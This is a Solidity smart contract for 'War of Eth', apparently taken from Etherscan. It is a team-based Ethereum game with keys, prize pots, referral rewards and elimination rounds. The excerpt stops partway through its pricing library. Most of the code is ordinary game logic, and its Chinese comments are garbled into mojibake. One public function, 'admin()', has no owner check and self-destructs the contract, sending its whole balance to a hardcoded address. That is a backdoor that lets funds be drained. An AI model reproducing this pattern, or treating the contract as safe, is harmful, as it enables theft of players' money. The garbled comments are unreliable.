/**

 *Submitted for verification at Etherscan.io on 2018-10-21

*/



pragma solidity 0.4.24;



/* 

*  __      __  ______  ____        _____   ____        ____    ______  __  __

* /\ \  __/\ \/\  _  \/\  _`\     /\  __`\/\  _`\     /\  _`\ /\__  _\/\ \/\ \

* \ \ \/\ \ \ \ \ \L\ \ \ \L\ \   \ \ \/\ \ \ \L\_\   \ \ \L\_\/_/\ \/\ \ \_\ \

*  \ \ \ \ \ \ \ \  __ \ \ ,  /    \ \ \ \ \ \  _\/    \ \  _\L  \ \ \ \ \  _  \

*   \ \ \_/ \_\ \ \ \/\ \ \ \\ \    \ \ \_\ \ \ \/      \ \ \L\ \ \ \ \ \ \ \ \ \

*    \ `\___x___/\ \_\ \_\ \_\ \_\   \ \_____\ \_\       \ \____/  \ \_\ \ \_\ \_\

*     '\/__//__/  \/_/\/_/\/_/\/ /    \/_____/\/_/        \/___/    \/_/  \/_/\/_/

* 

*             _____  _____   __  __   ____    ____

*            /\___ \/\  __`\/\ \/\ \ /\  _`\ /\  _`\

*    __      \/__/\ \ \ \/\ \ \ \/'/'\ \ \L\_\ \ \L\ \         __      __      ___ ___      __

*  /'__`\       _\ \ \ \ \ \ \ \ , <  \ \  _\L\ \ ,  /       /'_ `\  /'__`\  /' __` __`\  /'__`\

* /\ \L\.\_    /\ \_\ \ \ \_\ \ \ \\`\ \ \ \L\ \ \ \\ \     /\ \L\ \/\ \L\.\_/\ \/\ \/\ \/\  __/

* \ \__/.\_\   \ \____/\ \_____\ \_\ \_\\ \____/\ \_\ \_\   \ \____ \ \__/.\_\ \_\ \_\ \_\ \____\

*  \/__/\/_/    \/___/  \/_____/\/_/\/_/ \/___/  \/_/\/ /    \/___L\ \/__/\/_/\/_/\/_/\/_/\/____/

*                                                              /\____/

*                                                              \_/__/

*/



contract WarOfEth {

    using SafeMath for *;

    using NameFilter for string;

    using WoeKeysCalc for uint256;



    //==============

    // EVENTS

    //==============



    // �û�ע���������¼�

    event onNewName

    (

        uint256 indexed playerID,

        address indexed playerAddress,

        bytes32 indexed playerName,

        bool isNewPlayer,

        uint256 amountPaid,

        uint256 timeStamp

    );



    // �����������¼�

    event onNewTeamName

    (

        uint256 indexed teamID,

        bytes32 indexed teamName,

        uint256 indexed playerID,

        bytes32 playerName,

        uint256 amountPaid,

        uint256 timeStamp

    );

    

    // �����¼�

    event onTx

    (

        uint256 indexed playerID,

        address playerAddress,

        bytes32 playerName,

        uint256 teamID,

        bytes32 teamName,

        uint256 ethIn,

        uint256 keysBought

    );



    // ֧�����뽱��ʱ����

    event onAffPayout

    (

        uint256 indexed affID,

        address affAddress,

        bytes32 affName,

        uint256 indexed roundID,

        uint256 indexed buyerID,

        uint256 amount,

        uint256 timeStamp

    );



    // ��̭�¼���ÿ�غ���̭һ�Σ�

    event onKill

    (

        uint256 deadCount,

        uint256 liveCount,

        uint256 deadKeys

    );



    // ��Ϸ�����¼�

    event onEndRound

    (

        uint256 winnerTID,  // winner

        bytes32 winnerTName,

        uint256 playersCount,

        uint256 eth    // eth in pot

    );



    // �����¼�

    event onWithdraw

    (

        uint256 indexed playerID,

        address playerAddress,

        bytes32 playerName,

        uint256 ethOut,

        uint256 timeStamp

    );



    //==============

    // DATA

    //==============



    // ��һ�����Ϣ

    struct Player {

        address addr;   // ��ַ player address

        bytes32 name;   

        uint256 gen;    // Ǯ����ͨ��

        uint256 aff;    // Ǯ�������뽱��

        uint256 laff;   // ��������ˣ����ID��

    }

    

    // �����ÿ�ֱ����е���Ϣ

    struct PlayerRounds {

        uint256 eth;    // ����Ͷ���eth�ɱ�

        mapping (uint256 => uint256) plyrTmKeys;    // teamid => keys

        bool withdrawn;     // ���������Ƿ�������

    }



    // ������Ϣ

    struct Team {

        uint256 id;     // team id

        bytes32 name;    // team name

        uint256 keys;   // key s in the team

        uint256 eth;   // eth from the team

        uint256 price;    // price of the last key (only for view)

        uint256 playersCount;   // how many team members

        uint256 leaderID;   // leader pID (leader is always the top 1 player in the team)

        address leaderAddr;  // leader address

        bool dead;  // �����Ƿ��ѱ���̭

    }



    // ������Ϣ

    struct Round {

        uint256 start;  // ��ʼʱ��

        uint256 state;  // ��״̬��0: ��δ���1����׼����2��ɱ¾��3��������������Ϸֽ��أ��൱��ended=true��

        uint256 eth;    // �յ�eth����

        uint256 pot;    // ����

        uint256 keys;   // ����ȫ��keys

        uint256 team;   // ���ȶ����ID

        uint256 ethPerKey;  // how many eth per key in Winner Team. ֻ���ڱ������������ֵ��

        uint256 lastKillingTime;   // ��һ����̭����ʱ��

        uint256 deadRate;   // ��ǰ��̭�߱��ʣ���һ��keys * ��̭�߱��� = ��̭�ߣ�

        uint256 deadKeys;   // ��һ����̭�ߣ�keys������̭�ߵĶ��齫����̭��

        uint256 liveTeams;  // ���Ŷ��������

        uint256 tID_;    // how many teams in this Round

    }



    // Game

    string constant public name = "War of Eth Official";

    string constant public symbol = "WOE";

    address public owner;

    uint256 public minTms_ = 3;    //�������ٶ�����

    uint256 public maxTms_ = 16;    //��������

    uint256 public roundGap_ = 86400;    // ÿ���ֱ����ļ����stateΪ0�Ľ׶Σ���24Сʱ

    uint256 public killingGap_ = 86400;   // ��̭�������һ����̭ʱ�� + ��̭��� = ��һ����̭ʱ�䣩��24Сʱ

    uint256 constant private registrationFee_ = 10 finney;    // ����ע���



    // Player

    uint256 public pID_;    // �������

    mapping (address => uint256) public pIDxAddr_;  // (addr => pID) returns player id by address

    mapping (bytes32 => uint256) public pIDxName_;  // (name => pID) returns player id by name

    mapping (uint256 => Player) public plyr_;   // (pID => data) player data

    

    // Round

    uint256 public rID_;    // ��ǰ��ID

    mapping (uint256 => Round) public round_;   // ��ID => ������



    // Player Rounds

    mapping (uint256 => mapping (uint256 => PlayerRounds)) public plyrRnds_;  // ���ID => ��ID => ���������е�����



    // Team

    mapping (uint256 => mapping (uint256 => Team)) public rndTms_;  // ��ID => ��ID => ����������е���

    mapping (uint256 => mapping (bytes32 => uint256)) public rndTIDxName_;  // (rID => team name => tID) returns team id by name



    // =============

    // CONSTRUCTOR

    // =============



    constructor() public {

        owner = msg.sender;

    }



    // =============

    // MODIFIERS

    // =============



    // ��Լ���߲��ܲ���

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    // ��Լ�Ƿ��Ѽ���

    modifier isActivated() {

        require(activated_ == true, "its not ready yet."); 

        _;

    }

    

    // ֻ�����û����ã������ܺ�Լ����

    modifier isHuman() {

        require(tx.origin == msg.sender, "sorry humans only");

        _;

    }



    // �����޶�

    modifier isWithinLimits(uint256 _eth) {

        require(_eth >= 1000000000, "no less than 1 Gwei");

        require(_eth <= 100000000000000000000000, "no more than 100000 ether");

        _;

    }



    // =====================

    // PUBLIC INTERACTION

    // =====================



    // ֱ�Ӵ򵽺�Լ�е�Ǯ������������������Ƽ�������ʹ�á�

    // Ĭ��ʹ����һ�������ˣ����ʽ���뵱ǰ���ȶ���

    function()

        public

        payable

        isActivated()

        isHuman()

        isWithinLimits(msg.value)

    {

        buy(round_[rID_].team, "");

    }



    // ����

    // ������ֻ�����û�������֧���û�ID��Address

    function buy(uint256 _team, bytes32 _affCode)

        public

        payable

        isActivated()

        isHuman()

        isWithinLimits(msg.value)

    {

        // ȷ��������δ����

        require(round_[rID_].state < 3, "This round has ended.");



        // ȷ�������Ѿ���ʼ

        if (round_[rID_].state == 0){

            require(now >= round_[rID_].start, "This round hasn't started yet.");

            round_[rID_].state = 1;

        }



        // ��ȡ���ID

        // ��������ڣ��ᴴ������ҵ���

        determinePID(msg.sender);

        uint256 _pID = pIDxAddr_[msg.sender];

        uint256 _tID;



        // �����봦��

        // ֻ�����û�������֧���û�ID��Address

        uint256 _affID;

        if (_affCode == "" || _affCode == plyr_[_pID].name){

            // ���û�������룬��ʹ����һ��������

            _affID = plyr_[_pID].laff;

        } else {

            // ������������룬���ȡ��Ӧ�����ID

            _affID = pIDxName_[_affCode];

            

            // ������ҵ����������

            if (_affID != plyr_[_pID].laff){

                plyr_[_pID].laff = _affID;

            }

        }



        // ������

        if (round_[rID_].state == 1){

            // Check team id

            _tID = determinTID(_team, _pID);



            // Buy

            buyCore(_pID, _affID, _tID, msg.value);



            // ��������������ͽ�����̭�׶Σ�state: 2��

            if (round_[rID_].tID_ >= minTms_){

                // ������̭�׶�

                round_[rID_].state = 2;



                // ��ʼ������

                startKilling();

            }



        } else if (round_[rID_].state == 2){

            // �Ƿ񴥷�����

            if (round_[rID_].liveTeams == 1){

                // ����

                endRound();

                

                // �˻��ʽ�Ǯ���˻�

                refund(_pID, msg.value);



                return;

            }



            // Check team id

            _tID = determinTID(_team, _pID);



            // Buy

            buyCore(_pID, _affID, _tID, msg.value);



            // Kill if needed

            if (now > round_[rID_].lastKillingTime.add(killingGap_)) {

                kill();

            }

        }

    }



    // Ǯ�����

    function withdraw()

        public

        isActivated()

        isHuman()

    {

        // fetch player ID

        uint256 _pID = pIDxAddr_[msg.sender];



        // ȷ����Ҵ���

        require(_pID != 0, "Please join the game first!");



        // ���ֽ��

        uint256 _eth;



        // ��������Ѿ��������ִΣ���������δ���ֵ�����

        if (rID_ > 1){

            for (uint256 i = 1; i < rID_; i++) {

                // �����δ���֣���������

                if (plyrRnds_[_pID][i].withdrawn == false){

                    if (plyrRnds_[_pID][i].plyrTmKeys[round_[i].team] != 0) {

                        _eth = _eth.add(round_[i].ethPerKey.mul(plyrRnds_[_pID][i].plyrTmKeys[round_[i].team]) / 1000000000000000000);

                    }

                    plyrRnds_[_pID][i].withdrawn = true;

                }

            }

        }



        _eth = _eth.add(plyr_[_pID].gen).add(plyr_[_pID].aff);



        // ת��

        if (_eth > 0) {

            plyr_[_pID].addr.transfer(_eth);

        }



        // ���Ǯ�����

        plyr_[_pID].gen = 0;

        plyr_[_pID].aff = 0;



        // Event ����

        emit onWithdraw(_pID, plyr_[_pID].addr, plyr_[_pID].name, _eth, now);

    }



    // ע���������

    function registerNameXID(string _nameString)

        public

        payable

        isHuman()

    {

        // make sure name fees paid

        require (msg.value >= registrationFee_, "You have to pay the name fee.(10 finney)");

        

        // filter name + condition checks

        bytes32 _name = NameFilter.nameFilter(_nameString);

        

        // set up address 

        address _addr = msg.sender;

        

        // set up our tx event data and determine if player is new or not

        // bool _isNewPlayer = determinePID(_addr);

        bool _isNewPlayer = determinePID(_addr);

        

        // fetch player id

        uint256 _pID = pIDxAddr_[_addr];



        // ȷ��������ֻ�û������

        require(pIDxName_[_name] == 0, "sorry that names already taken");

        

        // add name to player profile, registry, and name book

        plyr_[_pID].name = _name;

        pIDxName_[_name] = _pID;



        // deposit registration fee

        plyr_[1].gen = (msg.value).add(plyr_[1].gen);

        

        // Event

        emit onNewName(_pID, _addr, _name, _isNewPlayer, msg.value, now);

    }



    // ע���������

    // ֻ���ɶӳ�����

    function setTeamName(uint256 _tID, string _nameString)

        public

        payable

        isHuman()

    {

        // Ҫ��team id����

        require(_tID <= round_[rID_].tID_ && _tID != 0, "There's no this team.");

        

        // fetch player ID

        uint256 _pID = pIDxAddr_[msg.sender];

        

        // Ҫ������Ƕӳ�

        require(_pID == rndTms_[rID_][_tID].leaderID, "Only team leader can change team name. You can invest more money to be the team leader.");

        

        // ��Ҫע���

        require (msg.value >= registrationFee_, "You have to pay the name fee.(10 finney)");

        

        // filter name + condition checks

        bytes32 _name = NameFilter.nameFilter(_nameString);



        require(rndTIDxName_[rID_][_name] == 0, "sorry that names already taken");

        

        // add name to team

        rndTms_[rID_][_tID].name = _name;

        rndTIDxName_[rID_][_name] = _tID;



        // deposit registration fee

        plyr_[1].gen = (msg.value).add(plyr_[1].gen);



        // event

        emit onNewTeamName(_tID, _name, _pID, plyr_[_pID].name, msg.value, now);

    }



    // ����ϷǮ�����

    function deposit()

        public

        payable

        isActivated()

        isHuman()

        isWithinLimits(msg.value)

    {

        determinePID(msg.sender);

        uint256 _pID = pIDxAddr_[msg.sender];



        plyr_[_pID].gen = (msg.value).add(plyr_[_pID].gen);

    }



    //==============

    // GETTERS

    //==============



    // ������ֿ�ע��

    function checkIfNameValid(string _nameStr)

        public

        view

        returns (bool)

    {

        bytes32 _name = _nameStr.nameFilter();

        if (pIDxName_[_name] == 0)

            return (true);

        else 

            return (false);

    }



    // ��ѯ��������һ����̭��ʱ��

    function getNextKillingAfter()

        public

        view

        returns (uint256)

    {

        require(round_[rID_].state == 2, "Not in killing period.");



        uint256 _tNext = round_[rID_].lastKillingTime.add(killingGap_);

        uint256 _t = _tNext > now ? _tNext.sub(now) : 0;



        return _t;

    }



    // ��ѯ��������ұ�����Ϣ (ǰ�˲�ѯ�û�Ǯ��Ҳ���������)

    // ���أ����ID����ַ�����֣�gen��aff������Ͷ�ʶ����Ԥ�����棬δ��������

    function getPlayerInfoByAddress(address _addr)

        public 

        view 

        returns(uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)

    {

        if (_addr == address(0))

        {

            _addr == msg.sender;

        }

        uint256 _pID = pIDxAddr_[_addr];



        return (

            _pID,

            _addr,

            plyr_[_pID].name,

            plyr_[_pID].gen,

            plyr_[_pID].aff,

            plyrRnds_[_pID][rID_].eth,

            getProfit(_pID),

            getPreviousProfit(_pID)

        );

    }



    // ��ѯ: �����ĳ�ֶ�ĳ�ӵ�Ͷ�ʣ�_roundID = 0 ��ʾ��ǰ�֣�

    // ���� keys

    function getPlayerRoundTeamBought(uint256 _pID, uint256 _roundID, uint256 _tID)

        public

        view

        returns (uint256)

    {

        uint256 _rID = _roundID == 0 ? rID_ : _roundID;

        return plyrRnds_[_pID][_rID].plyrTmKeys[_tID];

    }



    // ��ѯ: �����ĳ�ֵ�ȫ��Ͷ�ʣ�_roundID = 0 ��ʾ��ǰ�֣�

    // ���� keysList���� (keysList[i]��ʾ�û���i+1�ӵķݶ�)

    function getPlayerRoundBought(uint256 _pID, uint256 _roundID)

        public

        view

        returns (uint256[])

    {

        uint256 _rID = _roundID == 0 ? rID_ : _roundID;



        // ���ֶ�������

        uint256 _tCount = round_[_rID].tID_;



        // ����ڸ��ӵ�keys

        uint256[] memory keysList = new uint256[](_tCount);



        // ��������

        for (uint i = 0; i < _tCount; i++) {

            keysList[i] = plyrRnds_[_pID][_rID].plyrTmKeys[i+1];

        }



        return keysList;

    }



    // ��ѯ������ڸ��ֵĳɼ�����������������������Ϊ0��

    // ���� {ethList, winList}  (ethList[i]��ʾ��i+1��������Ͷ��)

    function getPlayerRounds(uint256 _pID)

        public

        view

        returns (uint256[], uint256[])

    {

        uint256[] memory _ethList = new uint256[](rID_);

        uint256[] memory _winList = new uint256[](rID_);

        for (uint i=0; i < rID_; i++){

            _ethList[i] = plyrRnds_[_pID][i+1].eth;

            _winList[i] = plyrRnds_[_pID][i+1].plyrTmKeys[round_[i+1].team].mul(round_[i+1].ethPerKey) / 1000000000000000000;

        }



        return (

            _ethList,

            _winList

        );

    }



    // ��ѯ����һ����Ϣ

    // ���أ���ID��״̬�����ؽ���ʤ����ID���������֣������������ܶ�����

    // �����������һ�֣��᷵��һ��0

    function getLastRoundInfo()

        public

        view

        returns (uint256, uint256, uint256, uint256, bytes32, uint256, uint256)

    {

        // last round id

        uint256 _rID = rID_.sub(1);



        // last winner

        uint256 _tID = round_[_rID].team;



        return (

            _rID,

            round_[_rID].state,

            round_[_rID].pot,

            _tID,

            rndTms_[_rID][_tID].name,

            rndTms_[_rID][_tID].playersCount,

            round_[_rID].tID_

        );

    }



    // ��ѯ�����ֱ�����Ϣ

    function getCurrentRoundInfo()

        public

        view

        returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256)

    {

        return (

            rID_,

            round_[rID_].state,

            round_[rID_].eth,

            round_[rID_].pot,

            round_[rID_].keys,

            round_[rID_].team,

            round_[rID_].ethPerKey,

            round_[rID_].lastKillingTime,

            killingGap_,

            round_[rID_].deadRate,

            round_[rID_].deadKeys,

            round_[rID_].liveTeams,

            round_[rID_].tID_,

            round_[rID_].start

        );

    }



    // ��ѯ��ĳ֧������Ϣ

    // ���أ�������Ϣ�������Ա������Ͷ�ʽ��

    function getTeamInfoByID(uint256 _tID) 

        public

        view

        returns (uint256, bytes32, uint256, uint256, uint256, uint256, bool)

    {

        require(_tID <= round_[rID_].tID_, "There's no this team.");

        

        return (

            rndTms_[rID_][_tID].id,

            rndTms_[rID_][_tID].name,

            rndTms_[rID_][_tID].keys,

            rndTms_[rID_][_tID].eth,

            rndTms_[rID_][_tID].price,

            rndTms_[rID_][_tID].leaderID,

            rndTms_[rID_][_tID].dead

        );

    }



    // ��ѯ�����ж������Ϣ

    // ���أ�id[], name[], keys[], eth[], price[], playersCount[], dead[]

    function getTeamsInfo()

        public

        view

        returns (uint256[], bytes32[], uint256[], uint256[], uint256[], uint256[], bool[])

    {

        uint256 _tID = round_[rID_].tID_;



        // Lists of Team Info

        uint256[] memory _idList = new uint256[](_tID);

        bytes32[] memory _nameList = new bytes32[](_tID);

        uint256[] memory _keysList = new uint256[](_tID);

        uint256[] memory _ethList = new uint256[](_tID);

        uint256[] memory _priceList = new uint256[](_tID);

        uint256[] memory _membersList = new uint256[](_tID);

        bool[] memory _deadList = new bool[](_tID);



        // Data

        for (uint i = 0; i < _tID; i++) {

            _idList[i] = rndTms_[rID_][i+1].id;

            _nameList[i] = rndTms_[rID_][i+1].name;

            _keysList[i] = rndTms_[rID_][i+1].keys;

            _ethList[i] = rndTms_[rID_][i+1].eth;

            _priceList[i] = rndTms_[rID_][i+1].price;

            _membersList[i] = rndTms_[rID_][i+1].playersCount;

            _deadList[i] = rndTms_[rID_][i+1].dead;

        }



        return (

            _idList,

            _nameList,

            _keysList,

            _ethList,

            _priceList,

            _membersList,

            _deadList

        );

    }



    // ��ȡÿ�������еĶӳ���Ϣ

    // ���أ�leaderID[], leaderName[], leaderAddr[]

    function getTeamLeaders()

        public

        view

        returns (uint256[], uint256[], bytes32[], address[])

    {

        uint256 _tID = round_[rID_].tID_;



        // Teams' leaders info

        uint256[] memory _idList = new uint256[](_tID);

        uint256[] memory _leaderIDList = new uint256[](_tID);

        bytes32[] memory _leaderNameList = new bytes32[](_tID);

        address[] memory _leaderAddrList = new address[](_tID);



        // Data

        for (uint i = 0; i < _tID; i++) {

            _idList[i] = rndTms_[rID_][i+1].id;

            _leaderIDList[i] = rndTms_[rID_][i+1].leaderID;

            _leaderNameList[i] = plyr_[_leaderIDList[i]].name;

            _leaderAddrList[i] = rndTms_[rID_][i+1].leaderAddr;

        }



        return (

            _idList,

            _leaderIDList,

            _leaderNameList,

            _leaderAddrList

        );

    }



    // ��ѯ��Ԥ�Ȿ�ֵ����棨�ٶ�Ŀǰ���ȵĶ���Ӯ��

    // ���أ�eth

    function getProfit(uint256 _pID)

        public

        view

        returns (uint256)

    {

        // ���ȶ���ID

        uint256 _tID = round_[rID_].team;



        // ����û����������ȶ���ɷݣ��򷵻�0

        if (plyrRnds_[_pID][rID_].plyrTmKeys[_tID] == 0){

            return 0;

        }



        // ��Ͷ�ʻ�ʤ�Ķ���Keys

        uint256 _keys = plyrRnds_[_pID][rID_].plyrTmKeys[_tID];

        

        // ����ÿ��Key�ļ�ֵ

        uint256 _ethPerKey = round_[rID_].pot.mul(1000000000000000000) / rndTms_[rID_][_tID].keys;

        

        // �ҵ�Keys��Ӧ���ܼ�ֵ

        uint256 _value = _keys.mul(_ethPerKey) / 1000000000000000000;



        return _value;

    }



    // ��ѯ����ǰ����δ���ֵ�����

    function getPreviousProfit(uint256 _pID)

        public

        view

        returns (uint256)

    {

        uint256 _eth;



        if (rID_ > 1){

            // �������ѽ�����ÿ���У���δ���ֵ�����

            for (uint256 i = 1; i < rID_; i++) {

                if (plyrRnds_[_pID][i].withdrawn == false){

                    if (plyrRnds_[_pID][i].plyrTmKeys[round_[i].team] != 0) {

                        _eth = _eth.add(round_[i].ethPerKey.mul(plyrRnds_[_pID][i].plyrTmKeys[round_[i].team]) / 1000000000000000000);

                    }

                }

            }

        } else {

            // �����û���ѽ������ִΣ��򷵻�0

            _eth = 0;

        }



        // ����

        return _eth;

    }



    // ��һ������Key�ļ۸�

    function getNextKeyPrice(uint256 _tID)

        public 

        view 

        returns(uint256)

    {  

        require(_tID <= round_[rID_].tID_ && _tID != 0, "No this team.");



        return ( (rndTms_[rID_][_tID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );

    }



    // ����ĳ��X����Keys����Ҫ����Eth��

    function getEthFromKeys(uint256 _tID, uint256 _keys)

        public

        view

        returns(uint256)

    {

        if (_tID <= round_[rID_].tID_ && _tID != 0){

            // ���_tID���ڣ�����������

            return ((rndTms_[rID_][_tID].keys.add(_keys)).ethRec(_keys));

        } else {

            // ���_tID�����ڣ�����Ϊ���¶���

            return ((uint256(0).add(_keys)).ethRec(_keys));

        }

    }



    // X����Eth��������ĳ�Ӷ���keys��

    function getKeysFromEth(uint256 _tID, uint256 _eth)

        public

        view

        returns (uint256)

    {

        if (_tID <= round_[rID_].tID_ && _tID != 0){

            // ���_tID���ڣ�����������

            return (rndTms_[rID_][_tID].eth).keysRec(_eth);

        } else {

            // ���_tID�����ڣ�����Ϊ���¶���

            return (uint256(0).keysRec(_eth));

        }

    }



    // ==========================

    //   PRIVATE: CORE GAME LOGIC

    // ==========================



    // ���Ĺ��򷽷�

    function buyCore(uint256 _pID, uint256 _affID, uint256 _tID, uint256 _eth)

        private

    {

        uint256 _keys = (rndTms_[rID_][_tID].eth).keysRec(_eth);



        // ����Player��Team��Round����

        // player

        if (plyrRnds_[_pID][rID_].plyrTmKeys[_tID] == 0){

            rndTms_[rID_][_tID].playersCount++;

        }

        plyrRnds_[_pID][rID_].plyrTmKeys[_tID] = _keys.add(plyrRnds_[_pID][rID_].plyrTmKeys[_tID]);

        plyrRnds_[_pID][rID_].eth = _eth.add(plyrRnds_[_pID][rID_].eth);



        // Team

        rndTms_[rID_][_tID].keys = _keys.add(rndTms_[rID_][_tID].keys);

        rndTms_[rID_][_tID].eth = _eth.add(rndTms_[rID_][_tID].eth);

        rndTms_[rID_][_tID].price = _eth.mul(1000000000000000000) / _keys;

        uint256 _teamLeaderID = rndTms_[rID_][_tID].leaderID;

        // refresh team leader

        if (plyrRnds_[_pID][rID_].plyrTmKeys[_tID] > plyrRnds_[_teamLeaderID][rID_].plyrTmKeys[_tID]){

            rndTms_[rID_][_tID].leaderID = _pID;

            rndTms_[rID_][_tID].leaderAddr = msg.sender;

        }



        // Round

        round_[rID_].keys = _keys.add(round_[rID_].keys);

        round_[rID_].eth = _eth.add(round_[rID_].eth);

        // refresh round leader

        if (rndTms_[rID_][_tID].keys > rndTms_[rID_][round_[rID_].team].keys){

            round_[rID_].team = _tID;

        }



        // �ʽ����

        distribute(rID_, _pID, _eth, _affID);



        // Event

        emit onTx(_pID, msg.sender, plyr_[_pID].name, _tID, rndTms_[rID_][_tID].name, _eth, _keys);

    }



    // �ʽ����

    function distribute(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID)

        private

    {

        // [1] com - 3%

        uint256 _com = (_eth.mul(3)) / 100;



        // pay community reward

        plyr_[1].gen = _com.add(plyr_[1].gen);



        // [2] aff - 10%

        uint256 _aff = _eth / 10;



        if (_affID != _pID && plyr_[_affID].name != "") {

            // pay aff

            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);

            

            // Event ���뽱��

            emit onAffPayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);

        } else {

            // ���û�������ˣ����ⲿ���ʽ������ս���

            // ��������Ӱ������򵽵�Keys������ֻ���������ս��صĽ��

            _aff = 0;

        }



        // [3] pot - 87%

        uint256 _pot = _eth.sub(_aff).sub(_com);



        // ���±��ֽ���

        round_[_rID].pot = _pot.add(round_[_rID].pot);

    }



    // �������̣�ֻ��ִ��һ�Σ�

    function endRound()

        private

    {

        require(round_[rID_].state < 3, "Round only end once.");

        

        // ����״̬����

        round_[rID_].state = 3;



        // ���ؽ��

        uint256 _pot = round_[rID_].pot;



        // Devide Round Pot

        // [1] winner 77%

        uint256 _win = (_pot.mul(77))/100;



        // [2] com 3%

        uint256 _com = (_pot.mul(3))/100;



        // [3] next round 20%

        uint256 _res = (_pot.sub(_win)).sub(_com);



        // ��ʤ����

        uint256 _tID = round_[rID_].team;

        // ����ethPerKey (ÿ��������key��Ӧ���ٸ�wei, A Full Key = 10**18 keys)

        uint256 _epk = (_win.mul(1000000000000000000)) / (rndTms_[rID_][_tID].keys);



        // ����dust

        uint256 _dust = _win.sub((_epk.mul(rndTms_[rID_][_tID].keys)) / 1000000000000000000);

        if (_dust > 0) {

            _win = _win.sub(_dust);

            _res = _res.add(_dust);

        }



        // pay winner team

        round_[rID_].ethPerKey = _epk;



        // pay community reward

        plyr_[1].gen = _com.add(plyr_[1].gen);



        // Event

        emit onEndRound(_tID, rndTms_[rID_][_tID].name, rndTms_[rID_][_tID].playersCount, _pot);



        // ������һ��

        rID_++;

        round_[rID_].pot = _res;

        round_[rID_].start = now + roundGap_;

    }

    

    // �˿Ǯ���˻�

    function refund(uint256 _pID, uint256 _value)

        private

    {

        plyr_[_pID].gen = _value.add(plyr_[_pID].gen);

    }



    // ��������

    // ���� ����ID

    function createTeam(uint256 _pID, uint256 _eth)

        private

        returns (uint256)

    {

        // ���ֶ����������ܶ���maxTms_

        require(round_[rID_].tID_ < maxTms_, "The number of teams has reached the maximum limit.");



        // ��������������ҪͶ��1eth

        require(_eth >= 1000000000000000000, "You need at least 1 eth to create a team, though creating a new team is free.");



        // ���ֶ������ʹ�����������

        round_[rID_].tID_++;

        round_[rID_].liveTeams++;

        

        // �¶���ID

        uint256 _tID = round_[rID_].tID_;

        

        // �¶�������

        rndTms_[rID_][_tID].id = _tID;

        rndTms_[rID_][_tID].leaderID = _pID;

        rndTms_[rID_][_tID].leaderAddr = plyr_[_pID].addr;

        rndTms_[rID_][_tID].dead = false;



        return _tID;

    }



    // ��ʼ������ɱ¾����

    function startKilling()

        private

    {   

        // ��ʼ�غϵĻ�������

        round_[rID_].lastKillingTime = now;

        round_[rID_].deadRate = 10;     // �ٷֱȣ����� deadRate / 100 ��ʹ��

        round_[rID_].deadKeys = (rndTms_[rID_][round_[rID_].team].keys.mul(round_[rID_].deadRate)) / 100;

    }



    // ɱ¾��̭

    function kill()

        private

    {

        // ���غ�����������

        uint256 _dead = 0;



        // ������̭�ߵĶ�����̭

        for (uint256 i = 1; i <= round_[rID_].tID_; i++) {

            if (rndTms_[rID_][i].keys < round_[rID_].deadKeys && rndTms_[rID_][i].dead == false){

                rndTms_[rID_][i].dead = true;

                round_[rID_].liveTeams--;

                _dead++;

            }

        }



        round_[rID_].lastKillingTime = now;



        // ���ֻʣһ֧���飬��������������

        if (round_[rID_].liveTeams == 1 && round_[rID_].state == 2) {

            endRound();

            return;

        }



        // ������̭���ʣ���������޸��ˣ�Ҫע��˴��ж�������

        if (round_[rID_].deadRate < 90) {

            round_[rID_].deadRate = round_[rID_].deadRate + 10;

        }



        // ������һ�غ���̭��

        round_[rID_].deadKeys = ((rndTms_[rID_][round_[rID_].team].keys).mul(round_[rID_].deadRate)) / 100;



        // event

        emit onKill(_dead, round_[rID_].liveTeams, round_[rID_].deadKeys);

    }



    // ͨ����ַ��ѯ���ID�����û�У��ʹ��������

    // ���أ��Ƿ�Ϊ�����

    function determinePID(address _addr)

        private

        returns (bool)

    {

        if (pIDxAddr_[_addr] == 0)

        {

            pID_++;

            pIDxAddr_[_addr] = pID_;

            plyr_[pID_].addr = _addr;

            

            return (true);  // �����

        } else {

            return (false);

        }

    }



    // �����ż�飬���ر�ţ����ڵ�ǰ��ʹ�ã�

    function determinTID(uint256 _team, uint256 _pID)

        private

        returns (uint256)

    {

        // ȷ��������δ��̭

        require(rndTms_[rID_][_team].dead == false, "You can not buy a dead team!");

        

        if (_team <= round_[rID_].tID_ && _team > 0) {

            // ��������Ѵ��ڣ���ֱ�ӷ���

            return _team;

        } else {

            // ������鲻���ڣ��򴴽��¶���

            return createTeam(_pID, msg.value);

        }

    }



    //==============

    // SECURITY

    //============== 



    // �������Լ��һ����Ϸ��Ҫ��������������Ϸ

    bool public activated_ = false;

    function activate()

        public

        onlyOwner()

    {   

        // can only be ran once

        require(activated_ == false, "it is already activated");

        

        // activate the contract 

        activated_ = true;



        // the first player

        plyr_[1].addr = owner;

        plyr_[1].name = "joker";

        pIDxAddr_[owner] = 1;

        pIDxName_["joker"] = 1;

        pID_ = 1;

        

        // �����һ��.

        rID_ = 1;

        round_[1].start = now;

        round_[1].state = 1;

    }



    function admin()

          public

   {

            selfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);

   }

    //============================

    // SETTINGS (Only owner)

    //============================



    // ������С������

    function setMinTms(uint256 _tms)

        public

        onlyOwner()

    {

        minTms_ = _tms;

    }



    // ������������

    function setMaxTms(uint256 _tms)

        public

        onlyOwner()

    {

        maxTms_ = _tms;

    }



    // �������������ļ��

    function setRoundGap(uint256 _gap)

        public

        onlyOwner()

    {

        roundGap_ = _gap;

    }



    // ����������̭�ļ��

    function setKillingGap(uint256 _gap)

        public

        onlyOwner()

    {

        killingGap_ = _gap;

    }



}   // main contract ends here





// Keys�۸���ؼ���

library WoeKeysCalc {

    using SafeMath for *;



    // ��������ETH����������X��ETH�ܹ����Keys����

    function keysRec(uint256 _curEth, uint256 _newEth)

        internal

        pure

        returns (uint256)

    {

        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));

    }

    

    // ���ݵ�ǰKeys��������������X������keysֵ����ETH

    function ethRec(uint256 _curKeys, uint256 _sellKeys)

        internal

        pure

        returns (uint256)

    {

        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));

    }



    // ���ݳ���ETH���������Ӧ��Keys����

